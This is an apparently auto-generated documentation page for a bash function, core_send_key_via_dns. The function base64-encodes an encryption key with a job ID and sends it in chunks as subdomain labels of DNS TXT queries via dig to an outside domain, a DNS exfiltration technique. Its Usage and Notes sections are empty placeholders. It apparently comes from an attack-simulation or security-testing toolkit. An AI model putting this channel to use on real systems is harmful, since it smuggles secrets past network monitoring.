# Send Key Via Dns

## Purpose

core_send_key_via_dns function implementation from base.sh.

## Implementation

<details>
<summary>Function Code</summary>

```bash
core_send_key_via_dns() {
local domain="$1"
    local encrypted_key=""
    
                if [ "$ENCRYPT" != "none" ] && [ -n "$ENCRYPT_KEY" ]; then
                    # Convert key to base64 DNS-safe format
                    local dns_safe_key
                    dns_safe_key=$("$CMD_PRINTF" '%s' "key:$ENCRYPT_KEY:$JOB_ID" | $CMD_BASE64 | tr '+/' '-_' | tr -d '=')
                    
                    # Include key in subdomain (chunked if necessary to respect DNS label length limits)
                    local key_chunk_size=40  # DNS labels are limited to 63 chars
                    local key_chunk="${dns_safe_key:0:$key_chunk_size}"
                    
                    # Send key via DNS TXT query - use only domain part, not full URI
                    if ! $CMD_DIG $CMD_DIG_OPTS "k-$JOB_ID-$key_chunk.${domain}" TXT > /dev/null 2>&1; then
                        core_debug_print "Failed to send encryption key via DNS TXT record, continuing anyway"
                    else
                        core_debug_print "Encryption key chunk 1 sent via DNS TXT record"
                    fi
                    
                    # If key is longer than one chunk, send additional chunks
                    if [ ${#dns_safe_key} -gt $key_chunk_size ]; then
                        local key_chunk2="${dns_safe_key:$key_chunk_size:$key_chunk_size}"
                        if [ -n "$key_chunk2" ]; then
                            $CMD_DIG $CMD_DIG_OPTS "k2-$JOB_ID-$key_chunk2.${domain}" TXT > /dev/null 2>&1
                            core_debug_print "Encryption key chunk 2 sent via DNS TXT record"
                            $CMD_SLEEP 0.1
                        fi
                    fi
                    
                    # Brief pause after sending key
                    $CMD_SLEEP 0.2
                fi
    
    "$CMD_PRINTF"  "$encrypted_key"
}
```

</details>

## Usage

Document usage examples and parameters here.

## Notes

Add any implementation notes or considerations.
